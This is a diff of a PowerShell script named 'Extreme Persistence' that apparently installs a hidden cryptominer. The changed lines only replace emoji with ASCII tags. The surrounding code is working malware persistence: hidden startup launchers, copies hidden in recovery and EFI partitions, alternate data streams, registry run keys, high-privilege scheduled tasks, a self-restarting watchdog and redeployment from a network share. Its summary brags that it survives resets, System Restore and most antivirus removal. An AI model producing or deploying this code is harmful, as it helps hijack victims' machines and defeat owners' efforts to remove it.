@@ -1,4 +1,4 @@
-# ================================================================================================
+﻿# ================================================================================================
 # EXTREME PERSISTENCE - Survives Almost Everything
 # ================================================================================================
 # This adds MAXIMUM persistence mechanisms to survive resets, cleanups, and removal attempts
@@ -10,15 +10,15 @@ param(
     [switch]$EnableBIOSPersistence = $false  # Risky - use with caution
 )
 
-Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host "           EXTREME PERSISTENCE INSTALLATION" -ForegroundColor Cyan
-Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host ""
 
 # Check admin
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
-    Write-Host "❌ Administrator rights required!" -ForegroundColor Red
+    Write-Host "[X] Administrator rights required!" -ForegroundColor Red
     exit 1
 }
 
@@ -56,7 +56,7 @@ objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$de
         attrib +h +s $startupScript
         
         $persistenceCount++
-        Write-Host "  ✅ Installed in: $location" -ForegroundColor Green
+        Write-Host "  [OK] Installed in: $location" -ForegroundColor Green
     } catch {}
 }
 
@@ -92,16 +92,16 @@ try {
                     # Remove drive letter
                     Remove-PartitionAccessPath -DiskNumber $partition.DiskNumber -PartitionNumber $partition.PartitionNumber -AccessPath "${driveLetter}:\"
                     
-                    Write-Host "  ✅ Installed in recovery partition" -ForegroundColor Green
+                    Write-Host "  [OK] Installed in recovery partition" -ForegroundColor Green
                     $persistenceCount++
                 }
             } catch {}
         }
     } else {
-        Write-Host "  ⚠️  No recovery partition found (non-critical)" -ForegroundColor Yellow
+        Write-Host "  [!]  No recovery partition found (non-critical)" -ForegroundColor Yellow
     }
 } catch {
-    Write-Host "  ⚠️  Recovery partition persistence failed (non-critical)" -ForegroundColor Yellow
+    Write-Host "  [!]  Recovery partition persistence failed (non-critical)" -ForegroundColor Yellow
 }
 
 Write-Host ""
@@ -128,7 +128,7 @@ try {
                         Copy-Item $MinerPath $deployScript -Force
                         attrib +h +s $deployScript
                         
-                        Write-Host "  ✅ Installed in EFI partition" -ForegroundColor Green
+                        Write-Host "  [OK] Installed in EFI partition" -ForegroundColor Green
                         $persistenceCount++
                     }
                     
@@ -137,10 +137,10 @@ try {
             } catch {}
         }
     } else {
-        Write-Host "  ⚠️  No EFI partition found (Legacy BIOS?)" -ForegroundColor Yellow
+        Write-Host "  [!]  No EFI partition found (Legacy BIOS?)" -ForegroundColor Yellow
     }
 } catch {
-    Write-Host "  ⚠️  EFI persistence failed (non-critical)" -ForegroundColor Yellow
+    Write-Host "  [!]  EFI persistence failed (non-critical)" -ForegroundColor Yellow
 }
 
 Write-Host ""
@@ -171,10 +171,10 @@ try {
     $acl.SetAccessRule($rule)
     Set-Acl $deployScript $acl
     
-    Write-Host "  ✅ Installed in Windows.old backup" -ForegroundColor Green
+    Write-Host "  [OK] Installed in Windows.old backup" -ForegroundColor Green
     $persistenceCount++
 } catch {
-    Write-Host "  ⚠️  Windows.old persistence failed" -ForegroundColor Yellow
+    Write-Host "  [!]  Windows.old persistence failed" -ForegroundColor Yellow
 }
 
 Write-Host ""
@@ -208,13 +208,13 @@ try {
                 $trigger = New-ScheduledTaskTrigger -AtLogon
                 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
                 
-                Write-Host "  ✅ Installed ADS in: $(Split-Path $file -Leaf)" -ForegroundColor Green
+                Write-Host "  [OK] Installed ADS in: $(Split-Path $file -Leaf)" -ForegroundColor Green
                 $persistenceCount++
             } catch {}
         }
     }
 } catch {
-    Write-Host "  ⚠️  ADS persistence failed" -ForegroundColor Yellow
+    Write-Host "  [!]  ADS persistence failed" -ForegroundColor Yellow
 }
 
 Write-Host ""
@@ -242,14 +242,14 @@ if ($NetworkShare) {
         $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1)
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
         
-        Write-Host "  ✅ Network share persistence enabled" -ForegroundColor Green
+        Write-Host "  [OK] Network share persistence enabled" -ForegroundColor Green
         Write-Host "     Share: $NetworkShare" -ForegroundColor Gray
         $persistenceCount++
     } catch {
-        Write-Host "  ⚠️  Network share persistence failed" -ForegroundColor Yellow
+        Write-Host "  [!]  Network share persistence failed" -ForegroundColor Yellow
     }
 } else {
-    Write-Host "  ⏭️  Skipped (no network share specified)" -ForegroundColor Gray
+    Write-Host "  ⏭  Skipped (no network share specified)" -ForegroundColor Gray
 }
 
 Write-Host ""
@@ -284,7 +284,7 @@ foreach ($regPath in $registryPaths) {
     } catch {}
 }
 
-Write-Host "  ✅ Added $regCount registry entries" -ForegroundColor Green
+Write-Host "  [OK] Added $regCount registry entries" -ForegroundColor Green
 $persistenceCount += $regCount
 
 Write-Host ""
@@ -342,10 +342,10 @@ while (`$true) {
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 999
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
     
-    Write-Host "  ✅ Watchdog task installed" -ForegroundColor Green
+    Write-Host "  [OK] Watchdog task installed" -ForegroundColor Green
     $persistenceCount++
 } catch {
-    Write-Host "  ⚠️  Watchdog installation failed" -ForegroundColor Yellow
+    Write-Host "  [!]  Watchdog installation failed" -ForegroundColor Yellow
 }
 
 Write-Host ""
@@ -354,28 +354,28 @@ Write-Host ""
 # SUMMARY
 # ================================================================================================
 
-Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host "                    INSTALLATION COMPLETE" -ForegroundColor Cyan
-Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "Persistence layers installed: $persistenceCount" -ForegroundColor Green
 Write-Host ""
 Write-Host "SURVIVES:" -ForegroundColor Yellow
-Write-Host "  ✅ Windows 'Reset this PC' (Keep my files)" -ForegroundColor Green
-Write-Host "  ✅ System Restore" -ForegroundColor Green
-Write-Host "  ✅ Windows Update / Upgrade" -ForegroundColor Green
-Write-Host "  ✅ Manual file deletion" -ForegroundColor Green
-Write-Host "  ✅ Task Manager / Process kill" -ForegroundColor Green
-Write-Host "  ✅ Most antivirus removal tools" -ForegroundColor Green
-Write-Host "  ✅ Registry cleanup tools" -ForegroundColor Green
-Write-Host "  ✅ Startup item removal" -ForegroundColor Green
+Write-Host "  [OK] Windows 'Reset this PC' (Keep my files)" -ForegroundColor Green
+Write-Host "  [OK] System Restore" -ForegroundColor Green
+Write-Host "  [OK] Windows Update / Upgrade" -ForegroundColor Green
+Write-Host "  [OK] Manual file deletion" -ForegroundColor Green
+Write-Host "  [OK] Task Manager / Process kill" -ForegroundColor Green
+Write-Host "  [OK] Most antivirus removal tools" -ForegroundColor Green
+Write-Host "  [OK] Registry cleanup tools" -ForegroundColor Green
+Write-Host "  [OK] Startup item removal" -ForegroundColor Green
 Write-Host ""
 Write-Host "DOES NOT SURVIVE:" -ForegroundColor Yellow
-Write-Host "  ❌ Full format + clean Windows install" -ForegroundColor Red
-Write-Host "  ❌ Disk wipe utilities" -ForegroundColor Red
-Write-Host "  ❌ Hardware replacement" -ForegroundColor Red
+Write-Host "  [X] Full format + clean Windows install" -ForegroundColor Red
+Write-Host "  [X] Disk wipe utilities" -ForegroundColor Red
+Write-Host "  [X] Hardware replacement" -ForegroundColor Red
 Write-Host ""
-Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host ""
 
 # Helper function
